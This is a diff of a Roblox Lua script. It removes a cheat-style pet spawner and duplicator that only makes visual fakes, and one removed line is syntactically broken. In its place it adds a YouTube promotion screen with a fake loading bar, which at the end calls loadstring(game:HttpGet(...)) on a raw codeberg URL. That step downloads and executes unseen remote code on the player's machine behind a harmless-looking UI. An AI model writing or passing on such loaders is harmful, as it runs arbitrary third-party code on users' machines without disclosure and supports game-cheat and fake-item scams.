@@ -1,365 +1,123 @@
-local player = game:GetService("Players").LocalPlayer
-local backpack = player:WaitForChild("Backpack")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
-local UIS = game:GetService("UserInputService")
 
--- GUI Setup
-local screenGui = Instance.new("ScreenGui", playerGui)spawnBtn.MouseButton1Click
-screenGui.Name = "PetSpawnerUI"
+-- ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "YoutubePromo"
 screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = playerGui
 
--- Toggle Button to reopen UI (made smaller)
-local toggleButton = Instance.new("TextButton", screenGui)
-toggleButton.Size = UDim2.new(0, 80, 0, 25)
-toggleButton.Position = UDim2.new(0, 10, 0, 10)
-toggleButton.Text = "Open UI"
-toggleButton.Font = Enum.Font.SourceSans
-toggleButton.TextSize = 14
-toggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-toggleButton.TextColor3 = Color3.new(1, 1, 1)
-Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0, 6)
-
--- Main UI Frame (reduced size)
-local mainFrame = Instance.new("Frame", screenGui)
-mainFrame.Size = UDim2.new(0, 250, 0, 280) -- Smaller dimensions
-mainFrame.Position = UDim2.new(0.5, -125, 0.5, -140) -- Centered
+-- Frame utama
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 350, 0, 120)
+mainFrame.Position = UDim2.new(0.5, -175, 0.85, -60)
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
 mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 mainFrame.BorderSizePixel = 0
-mainFrame.Active = true
-Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)
+mainFrame.Parent = screenGui
 
--- Draggable logic
-local dragging, dragStart, startPos
-mainFrame.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-		dragging = true
-		dragStart = input.Position
-		startPos = mainFrame.Position
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then
-				dragging = false
-			end
-		end)
-	end
-end)
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 15)
+corner.Parent = mainFrame
 
-UIS.InputChanged:Connect(function(input)
-	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-		local delta = input.Position - dragStart
-		mainFrame.Position = UDim2.new(
-			startPos.X.Scale, startPos.X.Offset + delta.X,
-			startPos.Y.Scale, startPos.Y.Offset + delta.Y
-		)
-	end
-end)
+-- Gambar profil
+local profileImage = Instance.new("ImageLabel")
+profileImage.Size = UDim2.new(0, 60, 0, 60)
+profileImage.Position = UDim2.new(0, 10, 0, 10)
+profileImage.BackgroundTransparency = 1
+profileImage.Image = "rbxassetid://101234822718079"
+profileImage.Parent = mainFrame
 
--- Show UI when toggle is clicked
-toggleButton.MouseButton1Click:Connect(function()
-	mainFrame.Visible = not mainFrame.Visible
-end)
+local profileCorner = Instance.new("UICorner")
+profileCorner.CornerRadius = UDim.new(1, 0)
+profileCorner.Parent = profileImage
 
--- Header with new title design (smaller)
-local header = Instance.new("Frame", mainFrame)
-header.Size = UDim2.new(1, 0, 0, 50) -- Reduced height
-header.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-header.BorderSizePixel = 0
-Instance.new("UICorner", header).CornerRadius = UDim.new(0, 8)
+-- Label Youtube
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, -80, 0, 30)
+titleLabel.Position = UDim2.new(0, 80, 0, 10)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "Youtube: ScriptBlox89"
+titleLabel.TextColor3 = Color3.new(1, 1, 1)
+titleLabel.TextScaled = true
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.Parent = mainFrame
 
--- Main Title "PET/SEED SPAWNER" (smaller text)
-local title = Instance.new("TextLabel", header)
-title.Text = "PET/SEED SPAWNER"
-title.Size = UDim2.new(1, 0, 0, 20)
-title.Position = UDim2.new(0, 0, 0, 5)
-title.Font = Enum.Font.SourceSansBold
-title.TextSize = 16 -- Smaller font
-title.TextColor3 = Color3.new(1, 1, 1)
-title.BackgroundTransparency = 1
+-- Bar abu-abu
+local grayBar = Instance.new("Frame")
+grayBar.Size = UDim2.new(1, -20, 0, 25)
+grayBar.Position = UDim2.new(0, 10, 0, 45)
+grayBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+grayBar.BorderSizePixel = 0
+grayBar.Parent = mainFrame
 
--- Credit "by @zenxq" (smaller text)
-local credit = Instance.new("TextLabel", header)
-credit.Text = "by @zenxq"
-credit.Size = UDim2.new(1, 0, 0, 12)
-credit.Position = UDim2.new(0, 0, 0, 25)
-credit.Font = Enum.Font.SourceSans
-credit.TextSize = 10 -- Smaller font
-credit.TextColor3 = Color3.new(0.8, 0.8, 0.8)
-credit.BackgroundTransparency = 1
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(0, 10)
+barCorner.Parent = grayBar
 
--- Tab Buttons (positioned below title and credit)
-local petTab = Instance.new("TextButton", header)
-petTab.Text = "PET"
-petTab.Size = UDim2.new(0.5, 0, 0, 25) -- Smaller height
-petTab.Position = UDim2.new(0, 0, 0, 38) -- Adjusted position
-petTab.Font = Enum.Font.SourceSans
-petTab.TextColor3 = Color3.new(1, 1, 1)
-petTab.TextSize = 16 -- Smaller font
-petTab.BackgroundTransparency = 1
+-- Bar loading
+local loadingBar = Instance.new("Frame")
+loadingBar.Size = UDim2.new(0, 0, 1, 0)
+loadingBar.Position = UDim2.new(0, 0, 0, 0)
+loadingBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+loadingBar.BorderSizePixel = 0
+loadingBar.Parent = grayBar
 
-local seedTab = Instance.new("TextButton", header)
-seedTab.Text = "SEED"
-seedTab.Size = UDim2.new(0.5, 0, 0, 25) -- Smaller height
-seedTab.Position = UDim2.new(0.5, 0, 0, 38) -- Adjusted position
-seedTab.Font = Enum.Font.SourceSans
-seedTab.TextColor3 = Color3.new(1, 1, 1)
-seedTab.TextSize = 16 -- Smaller font
-seedTab.BackgroundTransparency = 1
+local loadingCorner = Instance.new("UICorner")
+loadingCorner.CornerRadius = UDim.new(0, 10)
+loadingCorner.Parent = loadingBar
 
--- Close Button (smaller)
-local closeBtn = Instance.new("TextButton", header)
-closeBtn.Size = UDim2.new(0, 25, 0, 25) -- Smaller size
-closeBtn.Position = UDim2.new(1, -30, 0, 5) -- Adjusted position
-closeBtn.Text = "X"
-closeBtn.Font = Enum.Font.SourceSans
-closeBtn.TextSize = 16 -- Smaller font
-closeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-closeBtn.TextColor3 = Color3.new(1, 1, 1)
-Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
+-- Label Subscribe
+local subscribeLabel = Instance.new("TextLabel")
+subscribeLabel.Size = UDim2.new(1, -20, 0, 25)
+subscribeLabel.Position = UDim2.new(0, 10, 0, 80)
+subscribeLabel.BackgroundTransparency = 1
+subscribeLabel.Text = "Subscribe To ScriptBlox89"
+subscribeLabel.TextColor3 = Color3.new(1, 1, 1)
+subscribeLabel.TextScaled = true
+subscribeLabel.Font = Enum.Font.GothamBold
+subscribeLabel.TextXAlignment = Enum.TextXAlignment.Left
+subscribeLabel.Parent = mainFrame
 
--- Tab Frames (adjusted position for smaller header)
-local petTabFrame = Instance.new("Frame", mainFrame)
-petTabFrame.Position = UDim2.new(0, 0, 0, 50) -- Adjusted for smaller header
-petTabFrame.Size = UDim2.new(1, 0, 1, -50) -- Adjusted for smaller header
-petTabFrame.BackgroundTransparency = 1
+-- Loading bertahap
+local steps = {0.1, 0.25, 0.4, 0.6, 0.8, 1}
+local delayBetween = 0.5
 
-local seedTabFrame = petTabFrame:Clone()
-seedTabFrame.Parent = mainFrame
-seedTabFrame.Visible = false
-
--- Helper: Create TextBox (smaller)
-local function createTextBox(parent, placeholder, position)
-	local box = Instance.new("TextBox", parent)
-	box.Size = UDim2.new(0.9, 0, 0, 25) -- Smaller height
-	box.Position = position
-	box.PlaceholderText = placeholder
-	box.Text = ""
-	box.Font = Enum.Font.SourceSans
-	box.TextSize = 14 -- Smaller font
-	box.TextColor3 = Color3.new(1, 1, 1)
-	box.PlaceholderColor3 = Color3.fromRGB(200, 200, 200)
-	box.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
-	Instance.new("UICorner", box).CornerRadius = UDim.new(0, 5)
-	return box
-end
-
--- PET Tab UI (with adjusted positions for smaller UI)
-local petNameBox = createTextBox(petTabFrame, "Pet Name", UDim2.new(0.05, 0, 0.05, 0))
-local weightBox = createTextBox(petTabFrame, "Weight", UDim2.new(0.05, 0, 0.25, 0)) -- Adjusted position
-local ageBox = createTextBox(petTabFrame, "Age", UDim2.new(0.05, 0, 0.45, 0)) -- Adjusted position
-
--- Decimal number validation
-local function validateDecimalInput(textBox)
-    textBox:GetPropertyChangedSignal("Text"):Connect(function()
-        local newText = textBox.Text:gsub("[^%d.]", "")
-        local decimalCount = select(2, newText:gsub("%.", ""))
-        if decimalCount > 1 then
-            local parts = {}
-            for part in newText:gmatch("[^.]+") do
-                table.insert(parts, part)
-            end
-            newText = parts[1].."."..(parts[2] or "")
-        end
-        if newText:sub(1,1) == "." then
-            newText = "0"..newText
-        end
-        textBox.Text = newText
-    end)
-end
-
-validateDecimalInput(weightBox)
-validateDecimalInput(ageBox)
-
--- Helper: Create Button (smaller)
-local function createButton(parent, text, posY)
-	local btn = Instance.new("TextButton", parent)
-	btn.Size = UDim2.new(0.9, 0, 0, 25) -- Smaller height
-	btn.Position = UDim2.new(0.05, 0, posY, 0)
-	btn.Text = text
-	btn.Font = Enum.Font.SourceSans
-	btn.TextSize = 14 -- Smaller font
-	btn.TextColor3 = Color3.new(1, 1, 1)
-	btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
-	return btn
-end
-
-local spawnBtn = createButton(petTabFrame, "SPAWN PET", 0.65) -- Adjusted position
-local dupeBtn = createButton(petTabFrame, "DUPE PET", 0.8) -- Adjusted position
-
--- SEED Tab content (smaller)
-local seedLabel = Instance.new("TextLabel", seedTabFrame)
-seedLabel.Size = UDim2.new(1, 0, 0, 25) -- Smaller
-seedLabel.Position = UDim2.new(0, 0, 0.1, 0)
-seedLabel.Text = "Seed tab content coming soon..."
-seedLabel.Font = Enum.Font.SourceSans
-seedLabel.TextSize = 14 -- Smaller font
-seedLabel.TextColor3 = Color3.new(1, 1, 1)
-seedLabel.BackgroundTransparency = 1
-
--- Tab Switching
-petTab.MouseButton1Click:Connect(function()
-	petTabFrame.Visible = true
-	seedTabFrame.Visible = false
-end)
-
-seedTab.MouseButton1Click:Connect(function()
-	petTabFrame.Visible = false
-	seedTabFrame.Visible = true
-end)
-
--- Close
-closeBtn.MouseButton1Click:Connect(function()
-	mainFrame.Visible = false
-end)
-
--- Spawn Pet Functionality (unchanged)
-spawnBtn.MouseButton1Click:Connect(function()
-    local petName = petNameBox.Text
-    local petWeight = tonumber(weightBox.Text) or 1
-    local petAge = tonumber(ageBox.Text) or 1
-    
-    if not petName or string.len(petName) < 2 then
-        warn("Please enter a valid pet name")
-        return
-    end
-
-    local petTemplate
-    local validPets = {"Bee", "Slime", "Chick", "Bat", "Pupper", "Mole"}
-    
-    for _, petType in pairs(validPets) do
-        if string.find(petName:lower(), petType:lower()) then
-            petTemplate = game:GetService("ReplicatedStorage"):FindFirstChild(petType) or
-                         game:GetService("Workspace"):FindFirstChild(petType)
-            if petTemplate then break end
-        end
-    end
-
-    if not petTemplate then
-        warn("Pet type not found in: "..table.concat(validPets, ", "))
-        return
-    end
-
-    local visualPet = petTemplate:Clone()
-    visualPet.Name = petName
-    
-    if visualPet:FindFirstChild("Configuration") then
-        local config = visualPet.Configuration
-        if config:FindFirstChild("Weight") then config.Weight.Value = petWeight end
-        if config:FindFirstChild("Age") then config.Age.Value = petAge end
-    end
-
-    visualPet.Parent = game:GetService("Players").LocalPlayer.Backpack
-    
-    if visualPet:FindFirstChildOfClass("Humanoid") then
-        local humanoid = visualPet:FindFirstChildOfClass("Humanoid")
-        if not humanoid:FindFirstChildOfClass("Animator") then
-            Instance.new("Animator").Parent = humanoid
-        end
-    elseif visualPet:FindFirstChild("Animate") then
-        visualPet.Animate:Clone().Parent = visualPet
-    end
-
-    task.wait(0.2)
-    local char = game:GetService("Players").LocalPlayer.Character
-    if char and char:FindFirstChildOfClass("Humanoid") then
-        char:FindFirstChildOfClass("Humanoid"):EquipTool(visualPet)
-
--- Mulai Animasi Pet
-local anim = game.ReplicatedStorage:FindFirstChild("PetIdleAnimation")
-if anim then
-	local controller
-
-	if visualPet:FindFirstChildOfClass("Humanoid") then
-		controller = visualPet:FindFirstChildOfClass("Humanoid"):FindFirstChildOfClass("Animator")
-	else
-		controller = Instance.new("AnimationController")
-		controller.Name = "PetAnimator"
-		controller.Parent = visualPet
-		controller = controller:FindFirstChildOfClass("Animator") or Instance.new("Animator", controller)
+coroutine.wrap(function()
+	for i, progress in ipairs(steps) do
+		local tween = TweenService:Create(loadingBar, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
+			Size = UDim2.new(progress, 0, 1, 0)
+		})
+		tween:Play()
+		tween.Completed:Wait()
+		wait(delayBetween)
 	end
 
-	local track = controller:LoadAnimation(anim)
-	track:Play()
-end
+	-- Fade out UI
+	local fadeTween = TweenService:Create(mainFrame, TweenInfo.new(1), {
+		BackgroundTransparency = 1
+	})
+	fadeTween:Play()
 
-    print("Spawned visual pet:", petName, "Weight:", petWeight, "Age:", petAge)
-end)
+	for _, child in ipairs(mainFrame:GetDescendants()) do
+		if child:IsA("TextLabel") or child:IsA("ImageLabel") or child:IsA("Frame") then
+			TweenService:Create(child, TweenInfo.new(1), {
+				BackgroundTransparency = 1,
+				TextTransparency = child:IsA("TextLabel") and 1 or nil,
+				ImageTransparency = child:IsA("ImageLabel") and 1 or nil
+			}):Play()
+		end
+	end
 
--- Enhanced Dupe Logic (unchanged)
-dupeBtn.MouseButton1Click:Connect(function()
-    local player = game:GetService("Players").LocalPlayer
-    local backpack = player:WaitForChild("Backpack")
-    local char = player.Character or player.CharacterAdded:Wait()
-    
-    if not char then return end
-    
-    local tool = char:FindFirstChildOfClass("Tool") or backpack:FindFirstChildOfClass("Tool")
-    if not tool then
-        warn("No pet found equipped or in backpack")
-        return
-    end
+	wait(1.2)
+	screenGui:Destroy()
 
-    local fakeClone = tool:Clone()
-    
-    for _,v in pairs(fakeClone:GetDescendants()) do
-        if v:IsA("Script") or v:IsA("LocalScript") then
-            if not (v.Name:match("Animate")) 
-               and not (v.Name:match("Animation"))
-               and not (v.Name:match("Animator"))
-               and not (v.Name:match("Grip"))
-               and not (v.Name:match("Control"))
-               and not (v.Name:match("Motor")) then
-                v:Destroy()
-            end
-        end
-    end
-
-    if fakeClone:FindFirstChildOfClass("Humanoid") then
-        local humanoid = fakeClone:FindFirstChildOfClass("Humanoid")
-        if not humanoid:FindFirstChildOfClass("Animator") then
-            Instance.new("Animator").Parent = humanoid
-        end
-        
-        local originalHumanoid = tool:FindFirstChildOfClass("Humanoid")
-        if originalHumanoid and originalHumanoid:FindFirstChildOfClass("Animator") then
-            for _,track in pairs(originalHumanoid.Animator:GetPlayingAnimationTracks()) do
-                humanoid.Animator:LoadAnimation(track.Animation):Play()
-            end
-        end
-    else
-        local animateScript = tool:FindFirstChild("Animate") 
-        if animateScript then
-            animateScript:Clone().Parent = fakeClone
-        end
-        
-        for _,anim in pairs(tool:GetDescendants()) do
-            if anim:IsA("Animation") then
-                anim:Clone().Parent = fakeClone
-            end
-        end
-    end
-
-    fakeClone.Enabled = true
-    fakeClone.ManualActivationOnly = false
-    fakeClone.RequiresHandle = true
-    
-    if fakeClone:FindFirstChild("CanBeDropped") then
-        fakeClone.CanBeDropped = false
-    end
-    
-    fakeClone.Name = tool.Name
-    fakeClone.Parent = backpack
-
-    task.wait(0.2)
-    if char:FindFirstChildOfClass("Humanoid") then
-        char.Humanoid:EquipTool(fakeClone)
-        
-        task.wait(0.1)
-        if fakeClone:FindFirstChildOfClass("Humanoid") then
-            for _,track in pairs(fakeClone.Humanoid.Animator:GetPlayingAnimationTracks()) do
-                track:Play()
-            end
-        end
-    end
-    
-    print("Created animated duplicate of: "..tool.Name)
-end)
+	-- Load Spawner setelah UI hilang
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/DarkBackup/script/raw/branch/main/loadstring"))()
+Spawner.Load()
+end)()
